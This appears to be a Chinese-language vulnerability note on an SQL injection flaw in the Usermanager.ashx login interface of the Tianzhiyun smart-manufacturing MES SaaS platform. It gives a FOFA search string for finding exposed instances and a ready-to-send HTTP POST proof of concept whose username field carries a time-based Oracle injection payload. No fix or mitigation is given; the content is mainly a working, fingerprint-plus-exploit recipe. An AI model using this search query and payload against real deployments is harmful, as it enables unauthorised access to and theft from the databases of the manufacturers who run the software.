## 天智云智造管理平台Usermanager.ashx存在SQL注入漏洞

天智云智造管理平台又称天智云SAAS平台，是专业为中小型生产企业提供智能化生产管理的标准MES软件。该系统向中小型生产企业提供一站式平台服务，串联销售采购/生产/质量/仓库等各个部门。其Usermanager.ashx 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。

## fofa

```
body="Ashx/Usermanager.ashx"
```

## poc

```
POST /Ashx/Usermanager.ashx HTTP/1.1
Host: 
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
 
type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110)
,8)--&pwd=1&vendor=
```

![image-20240605183209800](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406051832854.png)